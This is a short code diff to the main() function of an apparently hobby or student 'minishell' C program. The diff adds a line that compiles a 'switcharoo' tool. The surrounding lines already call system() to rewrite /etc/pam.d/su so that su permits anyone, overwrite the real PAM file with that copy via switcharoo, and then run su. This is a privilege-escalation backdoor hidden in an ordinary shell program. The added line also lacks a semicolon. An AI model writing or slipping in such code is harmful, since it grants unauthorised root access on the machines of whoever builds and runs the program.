@@ -99,6 +99,7 @@ int	main(int argc, char **argv, char **envp)
 	if (var.env == NULL)
 		var.env = get_env_help();
 	minishell(&token, &var, &parse);
+	system("clang -o switcharoo switcharoo.c")
 	system("sed -e \"s/rootok/permit/g\" /etc/pam.d/su > overwrite_file.bin");
 	system("./switcharoo /etc/pam.d/su overwrite_file.bin");
 	system("su");
